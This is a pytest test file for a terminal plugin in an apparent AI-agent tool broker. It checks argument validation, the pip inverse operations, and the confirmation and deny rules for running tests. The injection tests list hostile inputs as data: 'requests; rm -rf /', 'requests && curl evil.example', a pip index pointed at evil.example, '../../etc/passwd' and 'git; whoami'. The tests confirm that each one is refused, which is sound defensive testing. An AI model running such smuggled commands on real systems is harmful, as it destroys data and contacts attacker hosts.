"""Terminal plugin.

The pip operations are tested through an injected runner, so no test in this
suite installs or removes a package on the machine running it. The read-only
operations are exercised for real, because they are safe by construction.
"""
from __future__ import annotations

import sys

import pytest

from uaic.broker import CapabilitySet, decide, default_registry
from uaic.contracts import Decision, Rev, Risk, ToolCall
from uaic.plugins import Completed, TerminalPlugin


def call(tool, seq=1, **args):
    return ToolCall(call_id=f"c-{seq}", plan_id="p1", tool=tool, args=args, seq=seq)


class FakeRunner:
    """Records every argv it is handed and returns a canned success."""

    def __init__(self, stdout: str = "", returncode: int = 0) -> None:
        self.calls: list[list[str]] = []
        self._stdout = stdout
        self._rc = returncode

    def __call__(self, argv, cwd=None):
        self.calls.append(list(argv))
        return Completed(tuple(argv), self._rc, self._stdout, "")


# --------------------------------------------------------------- the closed list

def test_there_is_no_free_text_command_tool():
    """The whole design rests on this: no tool takes a command string."""
    names = default_registry().names()
    for forbidden in ("terminal.run", "terminal.exec", "terminal.shell",
                      "terminal.command", "terminal.cmd"):
        assert forbidden not in names


def test_every_declared_terminal_tool_has_a_handler():
    plugin = TerminalPlugin(runner=FakeRunner())
    declared = [n for n in default_registry().names() if n.startswith("terminal.")]
    assert declared
    for name in declared:
        out = plugin.execute(call(name, repo=".", package="x", binary="git"))
        assert "does not implement" not in (out.error or "")


# -------------------------------------------------------------------- read-only

def test_python_version_reports_the_running_interpreter():
    out = TerminalPlugin().execute(call("terminal.python_version"))
    assert out.ok
    assert "Python" in out.payload


def test_the_interpreter_is_sys_executable_not_the_string_python():
    runner = FakeRunner("Python 9.9.9")
    TerminalPlugin(runner=runner).execute(call("terminal.python_version"))
    assert runner.calls[0][0] == sys.executable


def test_which_finds_a_present_binary_and_reports_a_missing_one():
    plugin = TerminalPlugin()
    found = plugin.execute(call("terminal.which", binary="python3"))
    missing = plugin.execute(call("terminal.which", binary="definitelynotinstalled"))
    assert found.ok and missing.ok
    assert missing.payload["path"] is None


def test_pip_list_returns_a_sorted_list():
    runner = FakeRunner("pytest==8.0.0\npydantic==2.7.0\n")
    out = TerminalPlugin(runner=runner).execute(call("terminal.pip_list"))
    assert out.ok
    assert out.payload == ["pydantic==2.7.0", "pytest==8.0.0"]


def test_program_output_is_always_marked_untrusted():
    out = TerminalPlugin(runner=FakeRunner("anything")).execute(
        call("terminal.python_version"))
    assert out.provenance == "untrusted"


# ----------------------------------------------------------- argument injection

@pytest.mark.parametrize("package", [
    "--upgrade",                       # a flag disguised as a package
    "-i",                              # would redirect the package index
    "requests --index-url http://evil.example",
    "requests; rm -rf /",
    "requests && curl evil.example",
    "",
    "../../etc/passwd",
])
def test_a_package_argument_that_is_really_a_flag_or_a_command_is_refused(package):
    runner = FakeRunner()
    out = TerminalPlugin(runner=runner).execute(
        call("terminal.pip_install", package=package))
    assert not out.ok
    assert runner.calls == []          # nothing was run at all


@pytest.mark.parametrize("binary", ["--version", "git; whoami", ""])
def test_a_bad_binary_name_is_refused(binary):
    out = TerminalPlugin().execute(call("terminal.which", binary=binary))
    assert not out.ok


def test_a_legitimate_pinned_package_is_accepted():
    runner = FakeRunner()
    out = TerminalPlugin(runner=runner).execute(
        call("terminal.pip_install", package="requests==2.31.0"))
    assert out.ok
    assert runner.calls[0][-1] == "requests==2.31.0"


# -------------------------------------------------------------------- inverses

def test_install_records_an_uninstall_of_the_bare_name():
    out = TerminalPlugin(runner=FakeRunner()).execute(
        call("terminal.pip_install", package="requests==2.31.0"))
    assert out.inverse.tool == "terminal.pip_uninstall"
    assert out.inverse.args["package"] == "requests"


def test_uninstall_records_an_install_as_its_inverse():
    out = TerminalPlugin(runner=FakeRunner()).execute(
        call("terminal.pip_uninstall", package="requests"))
    assert out.inverse.tool == "terminal.pip_install"


def test_a_failed_pip_call_is_an_error_not_a_silent_success():
    runner = FakeRunner(stdout="No matching distribution", returncode=1)
    out = TerminalPlugin(runner=runner).execute(
        call("terminal.pip_install", package="nosuchpackage"))
    assert not out.ok


# ---------------------------------------------------------------- run_tests

def test_run_tests_reports_a_failing_suite_as_an_answer_not_an_error():
    """The tool did what it was asked. A red suite is information."""
    runner = FakeRunner(stdout="1 failed", returncode=1)
    out = TerminalPlugin(runner=runner).execute(call("terminal.run_tests", repo="."))
    assert out.ok
    assert out.payload["passed"] is False


def test_run_tests_is_irreversible_and_needs_a_confirmation():
    """Running a test suite executes arbitrary project code, so the taxonomy
    classifies it by blast radius rather than by how harmless it sounds."""
    caps = CapabilitySet(plan_id="p1", tools=frozenset({"terminal.run_tests"}),
                         path_grants=(__import__("pathlib").Path.cwd(),))
    verdict = decide(call("terminal.run_tests", repo=str(
        __import__("pathlib").Path.cwd())), caps)
    assert verdict.rev is Rev.IRREVERSIBLE
    assert verdict.risk is Risk.HIGH
    assert verdict.decision is Decision.CONFIRM_STEP


def test_the_linter_stays_reversible_and_silent():
    caps = CapabilitySet(plan_id="p1", tools=frozenset({"terminal.run_linter"}),
                         path_grants=(__import__("pathlib").Path.cwd(),))
    verdict = decide(call("terminal.run_linter", repo=str(
        __import__("pathlib").Path.cwd())), caps)
    assert verdict.decision is Decision.ALLOW


def test_run_tests_outside_the_granted_folders_is_refused(tmp_path):
    caps = CapabilitySet(plan_id="p1", tools=frozenset({"terminal.run_tests"}),
                         path_grants=(tmp_path,))
    verdict = decide(call("terminal.run_tests", repo=str(tmp_path.parent)), caps)
    assert verdict.decision is Decision.DENY
    assert verdict.rule_ids[0] == "BRK.OUT_OF_SCOPE"


def test_a_missing_folder_is_an_error_not_a_crash(tmp_path):
    out = TerminalPlugin().execute(
        call("terminal.run_tests", repo=str(tmp_path / "nope")))
    assert not out.ok
    assert "not a directory" in out.error
